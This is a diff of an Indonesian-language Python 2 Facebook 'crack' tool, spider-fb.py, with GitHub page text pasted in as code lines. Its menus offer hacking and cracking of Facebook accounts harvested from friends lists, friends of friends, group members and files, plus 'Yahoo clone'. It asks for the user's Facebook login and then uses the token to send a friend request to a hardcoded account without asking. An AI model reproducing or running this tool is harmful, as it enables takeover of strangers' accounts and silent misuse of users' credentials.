@@ -1,3 +1,31 @@
+
+Skip to content
+Pull requests
+Issues
+Marketplace
+Explore
+@nawanfre17
+spider-fb /
+spider-fb
+
+3
+4
+
+    14
+
+Code
+Issues 0
+Pull requests 0
+Actions
+Projects 0
+Wiki
+Security 0
+
+    Insights
+
+spider-fb/spider-fb.py /
+@spider-fb spider-fb Update spider-fb.py 81716aa on Feb 19
+869 lines (821 sloc) 30.9 KB
 #!/usr/bin/python2
 # coding=utf-8
 
@@ -47,20 +75,19 @@ def jalan(z):
 		
 		
 logo = """  
-\033[0;1m█████████
-\033[0;1m█▄█████▄█     \033[1;96m●▬▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬▬●
-\033[0;1m█\033[1;91m▼▼▼▼▼\033[0;1m- _ --_--\033[32;1m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗
-\033[0;1m█  \033[0;1m-_-- -_ --__ \033[32;1m║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
-\033[0;1m█\033[1;91m▲▲▲▲▲\033[0;1m-- - _ --\033[32;1m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;91mELITE v1.1
-\033[0;1m█████████     \033[1;96m●▬▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬▬●
-\033[0;1m██ ██
-\033[0;1m╔════════════════════════════════════════════════╗
-\033[0;1m║\033[33;1m{*} \033[34;1mAuthor  \033[1;91m: \033[0;1mGUNAWAN\033[32;1m {✓}                       \033[0;1m║
-\033[0;1m║\033[33;1m{*} \033[34;1mGithub  \033[1;91m: \033[0;1mhttps://github.com/nawanfre17\033[32;1m {✓} \033[0;1m║
-\033[0;1m║\033[33;1m{*} \033[34;1mFacebok \033[1;91m: \033[0;1mhttps://fb.me/07042002thn\033[32;1m {✓}     \033[0;1m║
-\033[0;1m║\033[33;1m{*} \033[34;1mYouTube \033[1;91m: \033[0;1mNAWAN XT\033[32;1m {✓}                      \033[0;1m║
-\033[0;1m║\033[33;1m{*} \033[34;1mVersion \033[1;91m: \033[0;1mTerbaru 1.1\033[32;1m {✓}                   \033[0;1m║
-\033[0;1m╚════════════════════════════════════════════════╝
+\033[32;1m….._\____________________,,__
+\033[32;1m…./ `–│││││││││———————-_]
+\033[32;1m…/_==o ____________________DO°R*
+\033[32;1m…..),—.(_(__) /
+\033[32;1m….// (\) ),——
+\033[32;1m…//___//
+\033[32;1m../`—-’ / …
+\033[32;1m./____ / …Åhssine mohamed 🇲🇦
+\033[0;1m╔═══════════════════════════════════════════╗
+\033[0;1m║\033[33;1m* \033[34;1mGithub  \033[1;93m: \033[0;1mhttps://github.com/spider-fb  \033[1;93m                   
+\033[0;1m║\033[33;1m* \033[34;1mYT  \033[1;93m    : \033[0;1m\033[4mYotube/Android top4\033[0m \033[1;93m                  
+\033[0;1m║\033[33;1m* \033[34;1mWhatsApp  \033[1;93m : \033[0;1m\033[4m+212682934279\033[0m \033[1;93m       
+\033[0;1m╚═══════════════════════════════════════════╝
 """
 
 
@@ -80,27 +107,33 @@ listgrup = []
 vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
 
-
+def siapa():
+	os.system('clear')
+	nama = raw_input("\033[1;97mSiapa nama Mantan kamu ? \033[1;91m: \033[1;92m")
+	if nama =="":
+		print"\033[1;96m[!] \033[1;91mIsi yang benar"
+		time.sleep(1)
+		siapa()
+	else:
+		os.system('clear')
+		jalan("\033[1;97mSelamat datang \033[1;92m" +nama+ "\n\033[1;97mMejuah Juah Lae, Horas Medan !!")
+		time.sleep(1)
+		loginSC()
+		
+		
 def loginSC():
 	os.system('clear')
-        print 42*"\033[32;1m="
-	print"\033[1;96mLogin lisensi script nya,Terlebih dahulu bosku✓ \n"
-        print"\033[1;96mJika tidak tau lisensinya,ANDA bisa download dulu✓ \n"
-        print"\033[1;96mDi website yang ADMIN Sediakan, terimakasih✓ \n"
-        print 42*"\033[1;91m-"
-        print"\033[1;96m                                             \n"
-        print"\033[1;96mJANGGAN LUPA SUBSCRIBE JUGA YOUTUBE SAYA, NAWAN XT \n"
-        print 42*"\033[32;1m="
-	os.system('xdg-open https://semawur.com/0HzAcbt6MG')
-        username = raw_input("\033[1;96m[*] \033[1;97mUsername \033[1;91m: \033[1;92m")
+	print"\033[1;97mSilahkan login Lisensi Scriptnya dulu Lae,kalau gak tau Lisensinya,silahkan download Lisensinya di website yang barusan di Alihkan Otomatis\n"
+	os.system('xdg-open https://tatawirdat.blogspot.com')
+        username = raw_input("\033[1;96m[*] \033[1;97mID \033[1;91m: \033[1;92m")
 	password = raw_input("\033[1;96m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
-	if username =="Balai" and password =="Kami":
+	if username =="anak" and password =="binjai":
 		print"\033[1;96m[✓] \033[1;92mLogin success"
 		time.sleep(1)
 		login()
 	else:
 		print"\033[1;96m[!] \033[1;91mSalah!!"
-		os.system('xdg-open https://www.youtube.com/channel/UCKztewPdx7oFSNXyIfJd-7w?view_as=subscriber')
+		os.system('xdg-open https://tatawirdat.blogspot.com')
                 time.sleep(1)
                 LoginSC()
 
@@ -112,10 +145,8 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
-                print('\x1b[1;91m[!]\x1b[1;91mSILAHKAN LOGIN DI CHROME AGAR TIDAK CHECKPOINT✓')
-                print('\x1b[1;91m                                                             ')
-                print 42*"\033[1;96m="
-		print('\033[1;96m[☆] \x1b[1;93mLOGIN AKUN FACEBOOK ANDA \x1b[1;96m[☆]')
+		print 42*"\033[1;96m="
+		print('\033[1;96m[☆] \x1b[1;93mLOGIN AKUN FACEBOOK ANDA \x1b[1;96m[☆]' )
 		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
 		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
 		tik()
@@ -146,14 +177,14 @@ def login():
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://www.youtube.com/channel/UCKztewPdx7oFSNXyIfJd-7w?view_as=subscriber')
+				os.system('xdg-open https://www.youtube.com/channel/UCP0-8OzsHywqN461bVFjUbQ')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
 				keluar()
 		if 'checkpoint' in url:
 			print("\n\033[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint")
-			os.system('xdg-open https://www.youtube.com/channel/UCKztewPdx7oFSNXyIfJd-7w?view_as=subscriber')
+			os.system('xdg-open https://www.youtube.com/channel/UCP0-8OzsHywqN461bVFjUbQ')
 			time.sleep(1)
 			keluar()
 		else:
@@ -189,14 +220,15 @@ def menu():
 		keluar()
 	os.system("clear")
 	print logo
-        print('\x1b[1;91m[!]\x1b[1;91mSILAHKAN LOGIN DI CHROME AGAR TIDAK CHECKPOINT✓')
-        print('\x1b[1;91m                                                            ')
 	print 42*"\033[1;96m="
 	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Nama \033[1;91m: \033[1;92m"+nama+"\033[1;97m                  "
 	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
-	print "\x1b[32;1m1.\x1b[34;1m HACK FACEBOOK TERBARU {✓}"
-	print "\n\x1b[32;1m0.\x1b[33;1m LOGOUT            "
+	print "\x1b[32;1m1.\x1b[0;1m Hack facebook "
+	print "\x1b[32;1m2.\x1b[0;1m Lihat daftar grup               "
+	print "\x1b[32;1m3.\x1b[0;1m Informasi akun               "
+	print "\x1b[32;1m4.\x1b[0;1m Yahoo clone               "
+	print "\n\x1b[32;1m0.\x1b[0;1m Logout            "
 	pilih()
 
 
@@ -236,9 +268,11 @@ def super():
 	os.system('clear')
 	print logo
 	print 42*"\033[1;96m="
-	print "\x1b[32;1m1.\x1b[34;1m CRACK DARI DAFTAR TEMAN ANDA {✓}"
-	print "\x1b[32;1m2.\x1b[34;1m CRACK DARI ID TEMAN ANDA {✓}"
-	print "\n\x1b[32;1m0.\x1b[33;1m KEMBALI"
+	print "\x1b[32;1m1.\x1b[0;1m Crack dari daftar teman"
+	print "\x1b[32;1m2.\x1b[0;1m Crack dari teman dari teman"
+	print "\x1b[32;1m3.\x1b[0;1m Crack dari member grup"
+	print "\x1b[32;1m4.\x1b[0;1m Crack dari file"
+	print "\n\x1b[32;1m0.\x1b[33;1m Kembali"
 	pilih_super()
 
 def pilih_super():
@@ -258,19 +292,17 @@ def pilih_super():
 	elif peak =="2":
 		os.system('clear')
 		print logo
-                print('\x1b[1;91m[!]\x1b[1;91mSILAHKAN LOGIN DI CHROME AGAR TIDAK CHECKPOINT✓')
-                print('\x1b[1;91m                                                            ')
 		print 42*"\033[1;96m="
-		idt = raw_input("\033[1;96m[+] \033[32;1mMASUKAN ID TEMAN \033[1;91m: \033[1;97m")
+		idt = raw_input("\033[1;96m[+] \033[32;1mMasukan ID teman \033[1;91m: \033[1;97m")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[32;1mNAMA TEMAN\033[1;91m :\033[0;1m "+op["name"]
+			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[32;1mNama teman\033[1;91m :\033[0;1m "+op["name"]
 		except KeyError:
 			print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
 			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
 			super()
-		jalan('\033[1;96m[✓] \033[32;1mMENGAMBIL ID \033[1;97m...')
+		jalan('\033[1;96m[✓] \033[32;1mMengambil ID \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -286,7 +318,7 @@ def pilih_super():
 			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
 		except KeyError:
 			print"\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan"
-			raw_input("\n\033[1;96m[\033[1;97mKEMBALI\033[1;96m]")
+			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
 			super()
 		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
 		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
@@ -316,13 +348,10 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;96m[\033[1;97m✓\033[1;96m] \033[32;1mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
-	print('\x1b[1;96m[!] \x1b[0;1mSabar bosku,orang sabar di sayang Bapak/Ibu ✓')
-        print 42*"\033[1;91m="
-        print('\x1b[32;1mTobat la best Bulan RAMADHAN ini la :v                    ')
-        print('\x1b[32;1mBERSIH KAN GALERI KAU DARI VIDIO ***** TU :v              ')
-        print 42*"\033[1;96m="
+	print('\x1b[1;96m[!] \x1b[0;1mSabar om,orang sabar di sayang janda')
+	print 42*"\033[1;96m="
 	
-       		
+			
 	def main(arg):
 		global cekpoint,oks
 		user = arg
@@ -861,4 +890,23 @@ def clone_dari_file():
 	print"\033[1;96m[+] \033[1;92mFile Tersimpan \033[1;91m:\033[1;97m out/FileMailVuln.txt"
 	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
 	menu()
+	
+       
+		
+if __name__ == '__main__':
+	siapa()
+
+    © 2020 GitHub, Inc.
+    Terms
+    Privacy
+    Security
+    Status
+    Help
+
+    Contact GitHub
+    Pricing
+    API
+    Training
+    Blog
+    About
 
